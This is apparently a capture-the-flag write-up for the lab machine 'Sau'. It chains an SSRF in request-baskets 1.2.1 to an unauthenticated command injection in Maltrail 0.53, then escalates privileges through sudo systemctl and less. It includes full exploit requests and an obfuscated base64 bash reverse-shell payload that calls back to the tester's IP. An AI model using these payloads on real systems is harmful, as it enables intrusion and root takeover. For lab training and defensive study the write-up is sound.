# Sau

## Enumeration

### Nmap

{% code fullWidth="false" %}
```
# Nmap 7.94 scan initiated Wed Sep 27 12:50:55 2023 as: nmap -p22,80,8338,55555 -A -oA nmap/fullscan 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up (0.044s latency).

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 27 Sep 2023 16:51:17 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 27 Sep 2023 16:50:52 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 27 Sep 2023 16:50:53 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94%I=7%D=9/27%Time=65145D76%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\
SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Wed,\x2027\x20Sep\x20
SF:2023\x2016:50:52\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/w
SF:eb\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x202
SF:00\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Wed,\x2027\x20Sep\x20
SF:2023\x2016:50:53\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options
SF::\x20nosniff\r\nDate:\x20Wed,\x2027\x20Sep\x202023\x2016:51:17\x20GMT\r
SF:\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20nam
SF:e\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$\
SF:n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 55555/tcp)
HOP RTT      ADDRESS
1   43.27 ms 10.10.14.1
2   43.48 ms 10.10.11.224

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 27 12:52:30 2023 -- 1 IP address (1 host up) scanned in 95.81 seconds

```
{% endcode %}

### WebServer

<figure><img src="../../.gitbook/assets/Pasted image 20230927193555 (1).png" alt=""><figcaption></figcaption></figure>

Webiste footer reveal that website is powered by `request-basket` in version `1.2.1` This version is vulnerable to SSRF - Server Side Request Forgery vulnerability that allows attacker to force server to send request to other resources, in this scenario it could be possible to access whats on port `80` as this port isn't accessible from the outside - nmap showed it as `filtered` state. This is valuable because some services may run or may be accessible only from localhost or from local network, so attacker that exploit SSRF vulnerability can access this "unaccessible" services.&#x20;

{% embed url="https://github.com/entr0pie/CVE-2023-27163/tree/main" %}

#### SSRF

This reqeust create new `basket` for catching requests, with some additional settings:

* `forward_url` will forward all requests to this url
* `proxy_response` will show response returned from `forward_url`

```HTTP
POST /api/baskets/soviet4 HTTP/1.1
Host: 10.10.11.224:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 122


{
"forward_url":"http://127.0.0.1:80/login",
"proxy_response":true,
"insecure_tls":false,
"expand_path":false,
"capacity":200
}
```

Response with `Authorization` token for accessing data from API.

```HTTP
HTTP/1.1 201 Created
Content-Type: application/json; charset=UTF-8
Date: Wed, 27 Sep 2023 17:24:27 GMT
Content-Length: 56
Connection: close

{"token":"CkWWvwyJycJFadgUearLJTdTrii-Wvaa_v7NkVtUqaYY"}
```

After accessing `http://10.10.11.224:55555/soviet4` Maltrail in version 0.53 is revealed&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20230927195536 (1).png" alt=""><figcaption></figcaption></figure>

This also have PoC exploit available on github it is unauthenticated `RCE` Remote Code Execution&#x20;

{% embed url="https://github.com/spookier/Maltrail-v0.53-Exploit" %}

## Reverse Shell

So this allows to chain both `SSRF` with `RCE` to gain reverse shell on the machine.

This request is used to send `POST` request to internal `Maltrail` in `username` parameter there is encoded payload which should execute on target machine and establish connection with my machine

```
username=;`echo+YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTk2LzkwMDEgMD4mMSAK|base64+-d|bash`
```

```HTTP
POST /soviet4 HTTP/1.1
Host: 10.10.11.224:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 92

username=;`echo+YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTk2LzkwMDEgMD4mMSAK|base64+-d|bash`
```

<figure><img src="../../.gitbook/assets/Pasted image 20230927200103 (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### NOPASSWD SUDO

User `puma` can run `systemctl status` without password this allows to gain `root` shell&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20230927200307 (1).png" alt=""><figcaption></figcaption></figure>

This is possible because `systemctl status` invoke `less` binary that allows to execute shell commands if prefixed by `!` sign so `!bash` will spawn root bash shell&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20230927200616 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/e32fa1da35a312b9c8f2e13f04cedf6a.gif" alt=""><figcaption></figcaption></figure>
